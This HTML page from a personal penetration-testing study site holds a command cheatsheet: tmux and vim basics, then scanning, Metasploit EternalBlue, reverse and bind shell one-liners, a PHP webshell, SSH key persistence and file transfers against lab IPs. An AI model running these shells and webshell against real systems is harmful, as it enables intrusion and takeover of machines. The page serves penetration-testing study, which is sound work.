@@ -1,0 +1,1214 @@
+
+<!doctype html>
+<html lang="en" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+      
+      
+      <link rel="icon" href="../../../assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-1.3.0, mkdocs-material-8.3.8">
+    
+    
+      
+        <title>Cheatsheet 77 - Kreatur der Nacht</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../../assets/stylesheets/main.1d29e8d0.min.css">
+      
+        
+        <link rel="stylesheet" href="../../../assets/stylesheets/palette.cbb835fc.min.css">
+        
+      
+      
+    
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
+      
+    
+    
+    <script>__md_scope=new URL("../../..",location),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+  </head>
+  
+  
+    
+    
+      
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="slate" data-md-color-primary="black" data-md-color-accent="light-blue">
+  
+    
+    
+      <script>var palette=__md_get("__palette");if(palette&&"object"==typeof palette.color)for(var key of Object.keys(palette.color))document.body.setAttribute("data-md-color-"+key,palette.color[key])</script>
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#basic-tools" class="md-skip">
+          Skip to content
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+<header class="md-header" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="Header">
+    <a href="../../.." title="Kreatur der Nacht" class="md-header__button md-logo" aria-label="Kreatur der Nacht" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54Z"/></svg>
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3V6m0 5h18v2H3v-2m0 5h18v2H3v-2Z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            Kreatur der Nacht
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              Cheatsheet 77
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+      <form class="md-header__option" data-md-component="palette">
+        
+          
+          
+          <input class="md-option" data-md-color-media="(prefers-color-scheme: dark)" data-md-color-scheme="slate" data-md-color-primary="black" data-md-color-accent="light-blue"  aria-hidden="true"  type="radio" name="__palette" id="__palette_1">
+          
+        
+      </form>
+    
+    
+    
+      <label class="md-header__button md-icon" for="__search">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5Z"/></svg>
+      </label>
+      <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5Z"/></svg>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12Z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="Search">
+        
+        <button type="reset" class="md-search__icon md-icon" aria-label="Clear" tabindex="-1">
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12 19 6.41Z"/></svg>
+        </button>
+      </nav>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            Initializing search
+          </div>
+          <ol class="md-search-result__list"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+    
+  </nav>
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+          
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+<nav class="md-nav md-nav--primary" aria-label="Navigation" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../../.." title="Kreatur der Nacht" class="md-nav__button md-logo" aria-label="Kreatur der Nacht" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54Z"/></svg>
+
+    </a>
+    Kreatur der Nacht
+  </label>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+      
+
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../.." class="md-nav__link">
+        Hello World!
+      </a>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+    
+  
+  
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_2" type="checkbox" id="__nav_2" checked>
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_2">
+          00 honeypot
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="00 honeypot" data-md-level="1">
+        <label class="md-nav__title" for="__nav_2">
+          <span class="md-nav__icon md-icon"></span>
+          00 honeypot
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Links%20of%20Links/" class="md-nav__link">
+        Links of Links
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Q%20%26%20A/" class="md-nav__link">
+        Q & A
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Resources/" class="md-nav__link">
+        Resources
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Words%20of%20Wisdom/" class="md-nav__link">
+        Words of Wisdom
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_2_5" type="checkbox" id="__nav_2_5" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_2_5">
+          Writeups
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="Writeups" data-md-level="2">
+        <label class="md-nav__title" for="__nav_2_5">
+          <span class="md-nav__icon md-icon"></span>
+          Writeups
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Writeups/f1r57_h4ck/" class="md-nav__link">
+        f1r57_h4ck
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+    
+  
+  
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_2_6" type="checkbox" id="__nav_2_6" checked>
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_2_6">
+          Cheatsheets
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="Cheatsheets" data-md-level="2">
+        <label class="md-nav__title" for="__nav_2_6">
+          <span class="md-nav__icon md-icon"></span>
+          Cheatsheets
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+    
+  
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" data-md-toggle="toc" type="checkbox" id="__toc">
+      
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          Cheatsheet 77
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
+        Cheatsheet 77
+      </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#basic-tools" class="md-nav__link">
+    Basic Tools
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#pentesting" class="md-nav__link">
+    Pentesting
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_3" type="checkbox" id="__nav_3" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_3">
+          01   Introduction
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="01   Introduction" data-md-level="1">
+        <label class="md-nav__title" for="__nav_3">
+          <span class="md-nav__icon md-icon"></span>
+          01   Introduction
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../01%20-%20Introduction/00%20-%20penetration%20testing%20process/" class="md-nav__link">
+        Penetration Testing Process
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../01%20-%20Introduction/05%20-%20Getting%20Started/" class="md-nav__link">
+        Getting started
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_4" type="checkbox" id="__nav_4" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_4">
+          02   Reconnaissance, Enumeration & Attack Planning
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="02   Reconnaissance, Enumeration & Attack Planning" data-md-level="1">
+        <label class="md-nav__title" for="__nav_4">
+          <span class="md-nav__icon md-icon"></span>
+          02   Reconnaissance, Enumeration & Attack Planning
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../02%20-%20Reconnaissance%2C%20Enumeration%20%26%20Attack%20Planning/" class="md-nav__link">
+        Hello World!
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_5" type="checkbox" id="__nav_5" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_5">
+          03   Exploitation & Lateral Movement
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="03   Exploitation & Lateral Movement" data-md-level="1">
+        <label class="md-nav__title" for="__nav_5">
+          <span class="md-nav__icon md-icon"></span>
+          03   Exploitation & Lateral Movement
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../03%20-%20Exploitation%20%26%20Lateral%20Movement/" class="md-nav__link">
+        Hello World!
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_6" type="checkbox" id="__nav_6" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_6">
+          04   Web Exploitation
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="04   Web Exploitation" data-md-level="1">
+        <label class="md-nav__title" for="__nav_6">
+          <span class="md-nav__icon md-icon"></span>
+          04   Web Exploitation
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../04%20-%20Web%20Exploitation/" class="md-nav__link">
+        Hello World!
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_7" type="checkbox" id="__nav_7" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_7">
+          05   Post Exploitation
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="05   Post Exploitation" data-md-level="1">
+        <label class="md-nav__title" for="__nav_7">
+          <span class="md-nav__icon md-icon"></span>
+          05   Post Exploitation
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../05%20-%20Post-Exploitation/" class="md-nav__link">
+        Hello World!
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_8" type="checkbox" id="__nav_8" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_8">
+          06   Reporting & Capstone
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="06   Reporting & Capstone" data-md-level="1">
+        <label class="md-nav__title" for="__nav_8">
+          <span class="md-nav__icon md-icon"></span>
+          06   Reporting & Capstone
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../06%20-%20Reporting%20%26%20Capstone/" class="md-nav__link">
+        Hello World!
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#basic-tools" class="md-nav__link">
+    Basic Tools
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#pentesting" class="md-nav__link">
+    Pentesting
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          <div class="md-content" data-md-component="content">
+            <article class="md-content__inner md-typeset">
+              
+                
+
+
+  <h1>Cheatsheet 77</h1>
+
+<h2 id="basic-tools">Basic Tools<a class="headerlink" href="#basic-tools" title="Permanent link">&para;</a></h2>
+<table>
+<thead>
+<tr>
+<th><strong>Command</strong></th>
+<th><strong>Description</strong></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>General</strong></td>
+<td></td>
+</tr>
+<tr>
+<td><code>sudo openvpn user.ovpn</code></td>
+<td>Connect to VPN</td>
+</tr>
+<tr>
+<td><code>ifconfig</code>/<code>ip a</code></td>
+<td>Show our IP address</td>
+</tr>
+<tr>
+<td><code>netstat -rn</code></td>
+<td>Show networks accessible via the VPN</td>
+</tr>
+<tr>
+<td><code>ssh user@10.10.10.10</code></td>
+<td>SSH to a remote server</td>
+</tr>
+<tr>
+<td><code>ftp 10.129.42.253</code></td>
+<td>FTP to a remote server</td>
+</tr>
+<tr>
+<td><strong>tmux</strong></td>
+<td></td>
+</tr>
+<tr>
+<td><code>tmux</code></td>
+<td>Start tmux</td>
+</tr>
+<tr>
+<td><code>ctrl+b</code></td>
+<td>tmux: default prefix</td>
+</tr>
+<tr>
+<td><code>prefix c</code></td>
+<td>tmux: new window</td>
+</tr>
+<tr>
+<td><code>prefix 1</code></td>
+<td>tmux: switch to window (<code>1</code>)</td>
+</tr>
+<tr>
+<td><code>prefix shift+%</code></td>
+<td>tmux: split pane vertically</td>
+</tr>
+<tr>
+<td><code>prefix shift+"</code></td>
+<td>tmux: split pane horizontally</td>
+</tr>
+<tr>
+<td><code>prefix -&gt;</code></td>
+<td>tmux: switch to the right pane</td>
+</tr>
+<tr>
+<td><strong>Vim</strong></td>
+<td></td>
+</tr>
+<tr>
+<td><code>vim file</code></td>
+<td>vim: open <code>file</code> with vim</td>
+</tr>
+<tr>
+<td><code>esc+i</code></td>
+<td>vim: enter <code>insert</code> mode</td>
+</tr>
+<tr>
+<td><code>esc</code></td>
+<td>vim: back to <code>normal</code> mode</td>
+</tr>
+<tr>
+<td><code>x</code></td>
+<td>vim: Cut character</td>
+</tr>
+<tr>
+<td><code>dw</code></td>
+<td>vim: Cut word</td>
+</tr>
+<tr>
+<td><code>dd</code></td>
+<td>vim: Cut full line</td>
+</tr>
+<tr>
+<td><code>yw</code></td>
+<td>vim: Copy word</td>
+</tr>
+<tr>
+<td><code>yy</code></td>
+<td>vim: Copy full line</td>
+</tr>
+<tr>
+<td><code>p</code></td>
+<td>vim: Paste</td>
+</tr>
+<tr>
+<td><code>:1</code></td>
+<td>vim: Go to line number 1.</td>
+</tr>
+<tr>
+<td><code>:w</code></td>
+<td>vim: Write the file 'i.e. save'</td>
+</tr>
+<tr>
+<td><code>:q</code></td>
+<td>vim: Quit</td>
+</tr>
+<tr>
+<td><code>:q!</code></td>
+<td>vim: Quit without saving</td>
+</tr>
+<tr>
+<td><code>:wq</code></td>
+<td>vim: Write and quit</td>
+</tr>
+</tbody>
+</table>
+<h2 id="pentesting">Pentesting<a class="headerlink" href="#pentesting" title="Permanent link">&para;</a></h2>
+<table>
+<thead>
+<tr>
+<th><strong>Command</strong></th>
+<th><strong>Description</strong></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>Service Scanning</strong></td>
+<td></td>
+</tr>
+<tr>
+<td><code>nmap 10.129.42.253</code></td>
+<td>Run nmap on an IP</td>
+</tr>
+<tr>
+<td><code>nmap -sV -sC -p- 10.129.42.253</code></td>
+<td>Run an nmap script scan on an IP</td>
+</tr>
+<tr>
+<td><code>locate scripts/citrix</code></td>
+<td>List various available nmap scripts</td>
+</tr>
+<tr>
+<td><code>nmap --script smb-os-discovery.nse -p445 10.10.10.40</code></td>
+<td>Run an nmap script on an IP</td>
+</tr>
+<tr>
+<td><code>netcat 10.10.10.10 22</code></td>
+<td>Grab banner of an open port</td>
+</tr>
+<tr>
+<td><code>smbclient -N -L \\\\10.129.42.253</code></td>
+<td>List SMB Shares</td>
+</tr>
+<tr>
+<td><code>smbclient \\\\10.129.42.253\\users</code></td>
+<td>Connect to an SMB share</td>
+</tr>
+<tr>
+<td><code>snmpwalk -v 2c -c public 10.129.42.253 1.3.6.1.2.1.1.5.0</code></td>
+<td>Scan SNMP on an IP</td>
+</tr>
+<tr>
+<td><code>onesixtyone -c dict.txt 10.129.42.254</code></td>
+<td>Brute force SNMP secret string</td>
+</tr>
+<tr>
+<td><strong>Web Enumeration</strong></td>
+<td></td>
+</tr>
+<tr>
+<td><code>gobuster dir -u http://10.10.10.121/ -w /usr/share/dirb/wordlists/common.txt</code></td>
+<td>Run a directory scan on a website</td>
+</tr>
+<tr>
+<td><code>gobuster dns -d inlanefreight.com -w /usr/share/SecLists/Discovery/DNS/namelist.txt</code></td>
+<td>Run a sub-domain scan on a website</td>
+</tr>
+<tr>
+<td><code>curl -IL https://www.inlanefreight.com</code></td>
+<td>Grab website banner</td>
+</tr>
+<tr>
+<td><code>whatweb 10.10.10.121</code></td>
+<td>List details about the webserver/certificates</td>
+</tr>
+<tr>
+<td><code>curl 10.10.10.121/robots.txt</code></td>
+<td>List potential directories in <code>robots.txt</code></td>
+</tr>
+<tr>
+<td><code>ctrl+U</code></td>
+<td>View page source (in Firefox)</td>
+</tr>
+<tr>
+<td><strong>Public Exploits</strong></td>
+<td></td>
+</tr>
+<tr>
+<td><code>searchsploit openssh 7.2</code></td>
+<td>Search for public exploits for a web application</td>
+</tr>
+<tr>
+<td><code>msfconsole</code></td>
+<td>MSF: Start the Metasploit Framework</td>
+</tr>
+<tr>
+<td><code>search exploit eternalblue</code></td>
+<td>MSF: Search for public exploits in MSF</td>
+</tr>
+<tr>
+<td><code>use exploit/windows/smb/ms17_010_psexec</code></td>
+<td>MSF: Start using an MSF module</td>
+</tr>
+<tr>
+<td><code>show options</code></td>
+<td>MSF: Show required options for an MSF module</td>
+</tr>
+<tr>
+<td><code>set RHOSTS 10.10.10.40</code></td>
+<td>MSF: Set a value for an MSF module option</td>
+</tr>
+<tr>
+<td><code>check</code></td>
+<td>MSF: Test if the target server is vulnerable</td>
+</tr>
+<tr>
+<td><code>exploit</code></td>
+<td>MSF: Run the exploit on the target server is vulnerable</td>
+</tr>
+<tr>
+<td><strong>Using Shells</strong></td>
+<td></td>
+</tr>
+<tr>
+<td><code>nc -lvnp 1234</code></td>
+<td>Start a <code>nc</code> listener on a local port</td>
+</tr>
+<tr>
+<td><code>bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.10.10/1234 0&gt;&amp;1'</code></td>
+<td>Send a reverse shell from the remote server</td>
+</tr>
+<tr>
+<td><code>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f\|/bin/sh -i 2&gt;&amp;1\|nc 10.10.10.10 1234 &gt;/tmp/f</code></td>
+<td>Another command to send a reverse shell from the remote server</td>
+</tr>
+<tr>
+<td><code>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f\|/bin/bash -i 2&gt;&amp;1\|nc -lvp 1234 &gt;/tmp/f</code></td>
+<td>Start a bind shell on the remote server</td>
+</tr>
+<tr>
+<td><code>nc 10.10.10.1 1234</code></td>
+<td>Connect to a bind shell started on the remote server</td>
+</tr>
+<tr>
+<td><code>python -c 'import pty; pty.spawn("/bin/bash")'</code></td>
+<td>Upgrade shell TTY (1)</td>
+</tr>
+<tr>
+<td><code>ctrl+z</code> then <code>stty raw -echo</code> then <code>fg</code> then <code>enter</code> twice</td>
+<td>Upgrade shell TTY (2)</td>
+</tr>
+<tr>
+<td><code>echo "&lt;?php system(\$_GET['cmd']);?&gt;" &gt; /var/www/html/shell.php</code></td>
+<td>Create a webshell php file</td>
+</tr>
+<tr>
+<td><code>curl http://SERVER_IP:PORT/shell.php?cmd=id</code></td>
+<td>Execute a command on an uploaded webshell</td>
+</tr>
+<tr>
+<td><strong>Privilege Escalation</strong></td>
+<td></td>
+</tr>
+<tr>
+<td><code>./linpeas.sh</code></td>
+<td>Run <code>linpeas</code> script to enumerate remote server</td>
+</tr>
+<tr>
+<td><code>sudo -l</code></td>
+<td>List available <code>sudo</code> privileges</td>
+</tr>
+<tr>
+<td><code>sudo -u user /bin/echo Hello World!</code></td>
+<td>Run a command with <code>sudo</code></td>
+</tr>
+<tr>
+<td><code>sudo su -</code></td>
+<td>Switch to root user (if we have access to <code>sudo su</code>)</td>
+</tr>
+<tr>
+<td><code>sudo su user -</code></td>
+<td>Switch to a user (if we have access to <code>sudo su</code>)</td>
+</tr>
+<tr>
+<td><code>ssh-keygen -f key</code></td>
+<td>Create a new SSH key</td>
+</tr>
+<tr>
+<td><code>echo "ssh-rsa AAAAB...SNIP...M= user@parrot" &gt;&gt; /root/.ssh/authorized_keys</code></td>
+<td>Add the generated public key to the user</td>
+</tr>
+<tr>
+<td><code>ssh root@10.10.10.10 -i key</code></td>
+<td>SSH to the server with the generated private key</td>
+</tr>
+<tr>
+<td><strong>Transferring Files</strong></td>
+<td></td>
+</tr>
+<tr>
+<td><code>python3 -m http.server 8000</code></td>
+<td>Start a local webserver</td>
+</tr>
+<tr>
+<td><code>wget http://10.10.14.1:8000/linpeas.sh</code></td>
+<td>Download a file on the remote server from our local machine</td>
+</tr>
+<tr>
+<td><code>curl http://10.10.14.1:8000/linenum.sh -o linenum.sh</code></td>
+<td>Download a file on the remote server from our local machine</td>
+</tr>
+<tr>
+<td><code>scp linenum.sh user@remotehost:/tmp/linenum.sh</code></td>
+<td>Transfer a file to the remote server with <code>scp</code> (requires SSH access)</td>
+</tr>
+<tr>
+<td><code>base64 shell -w 0</code></td>
+<td>Convert a file to <code>base64</code></td>
+</tr>
+<tr>
+<td><code>echo f0VMR...SNIO...InmDwU \| base64 -d &gt; shell</code></td>
+<td>Convert a file from <code>base64</code> back to its orig</td>
+</tr>
+<tr>
+<td><code>md5sum shell</code></td>
+<td>Check the file's <code>md5sum</code> to ensure it converted correctly</td>
+</tr>
+</tbody>
+</table>
+
+              
+            </article>
+            
+          </div>
+        </div>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+    
+    <nav class="md-footer__inner md-grid" aria-label="Footer" >
+      
+        
+        <a href="../../Writeups/f1r57_h4ck/" class="md-footer__link md-footer__link--prev" aria-label="Previous: f1r57_h4ck" rel="prev">
+          <div class="md-footer__button md-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12Z"/></svg>
+          </div>
+          <div class="md-footer__title">
+            <div class="md-ellipsis">
+              <span class="md-footer__direction">
+                Previous
+              </span>
+              f1r57_h4ck
+            </div>
+          </div>
+        </a>
+      
+      
+        
+        <a href="../../../01%20-%20Introduction/00%20-%20penetration%20testing%20process/" class="md-footer__link md-footer__link--next" aria-label="Next: Penetration Testing Process" rel="next">
+          <div class="md-footer__title">
+            <div class="md-ellipsis">
+              <span class="md-footer__direction">
+                Next
+              </span>
+              Penetration Testing Process
+            </div>
+          </div>
+          <div class="md-footer__button md-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M4 11v2h12l-5.5 5.5 1.42 1.42L19.84 12l-7.92-7.92L10.5 5.5 16 11H4Z"/></svg>
+          </div>
+        </a>
+      
+    </nav>
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+  
+    Made with
+    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+      Material for MkDocs
+    </a>
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
